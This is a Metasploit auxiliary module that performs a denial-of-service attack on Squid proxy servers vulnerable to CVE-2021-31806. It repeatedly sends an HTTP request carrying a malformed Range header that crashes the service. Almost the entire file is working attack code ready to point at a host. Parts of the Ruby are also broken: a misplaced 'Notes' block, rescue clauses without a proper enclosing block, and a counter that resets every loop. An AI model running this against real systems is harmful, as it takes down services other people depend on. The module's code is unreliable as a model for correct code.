##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Squid Proxy Range Header DoS',
      'Description'    => %q{
          The range handler in The Squid Caching Proxy Server 3.0-4.1.4 and 
        5.0.1-5.0.5 incorrectly handles impossible-to-satisfy range requests, and
        allows remote attackers to cause a deniel of service (assertion) through 
        a single HTTP request via a specific Range header."
      },
      'Author'         =>
        [
          'Joshua Rogers' # Discoverer, and Metasploit Module
        ],
      'License'        => MSF_LICENSE,
      'Actions'        =>
        [
          ['DOS', 'Description' => 'Perform Denial of Service Against The Target']
        ],
      'DefaultAction'  => 'DOS',
      'References'     =>
        [
          [ 'CVE', '2021-31806'],
          [ 'URL', 'https://blogs.opera.com/security/2021/10/fuzzing-http-proxies-squid-part-2/']
        ],
      'DisclosureDate' => '2021-05-27'
    )
      'Notes' => {
        'Stability' => [ CRASH_SERVICE_DOWN ],
        'Reliability' => [ ],
        'SideEffects' => [ IOC_IN_LOGS ]
      }
)

    register_options(
      [
        Opt::RPORT(3128),
        OptString.new('RequestCount',     [ true, "The number of requests to be sent, as well as the number of re-tries to confirm a dead host" , 50 ]),
      ])
  end


  def run
    res = [
      "GET http://neverssl.com/ HTTP/1.1",
      "Host: neverssl.com",
      "User-Agent: Mozilla",
      "Accept: */*",
      "Proxy-Connection: Keep-Alive",
      "Range: bytes=0-0,-0,-1", # This request range is not handled correctly by Squid, and causes an assertion.
      "\r\n"
      ].join("\r\n");

    begin

      count = 0
      error_count = 0
      reqs = datastore['RequestCount'].to_i
      print_status("Sending #{reqs} DoS requests to #{peer}")

      loop do

        connect

        count += 1
        break if count > reqs

        error_count = 0
        print_status("Sending DoS packet #{count} to #{rhost}:#{rport}")
        sock.put(res)

        data = sock.get_once(-1)
        if data !~ /206 Partial Content/i
          print_error("Unexpected Response. Squid host may not be valid.")
        end

        disconnect

        rescue ::Rex::InvalidDestination, ::Rex::ConnectionTimeout, ::Errno::ECONNRESET
          print_error('Connection Error.')
          return false
        rescue ::Rex::ConnectionRefused
          if count == 0
            print_error("Cannot connect to Squid host.")
            return false
          end
          error_count += 1
          if error_count > reqs
            print_good("DoS completely successful")
            return true
          end
      end
    end

    print_error("DoS Failed. Host may not be vulnerable.")

  end
end
